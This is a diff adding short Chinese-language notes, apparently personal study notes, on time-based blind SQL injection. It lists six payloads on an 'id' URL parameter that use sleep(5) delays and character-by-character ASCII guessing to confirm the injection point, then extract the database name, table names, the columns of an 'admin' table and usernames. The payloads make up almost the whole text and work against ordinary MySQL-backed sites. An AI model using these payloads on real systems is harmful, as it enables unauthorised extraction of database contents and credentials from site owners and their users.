@@ -1,0 +1,13 @@
+就是猜
+1.判断注入点：
+?id=2 and sleep(5)
+2.猜当前数据库长度
+?id=2 and if(length(database())<10,sleep(5),1)         # 延时=库名长度<10；不延时=5，不断调整数字确定长度（睡眠就知道条件成立）
+3.逐位猜库名字符（示例：第 1 位）
+?id=2 and if(ascii(substr(database(),1,1))=106,sleep(5),1) #j（查找每一个字符）
+4.爆表名
+?id=2 and if(ascii(substr((select table_name from information_schema.tables where table_schema='test_db' limit 0,1),1,1))=115,sleep(5),1)
+5.爆字段名
+?id=2  and if(ascii(substr((select column_name from information_schema.columns where table_schema='test_db' and table_name='admin' limit 0,1),1,1))>80,sleep(5),1)
+6.爆数据
+?id=2 and if(ascii(substr((select username from message limit 0,1),1,1))>50,sleep(5),1)
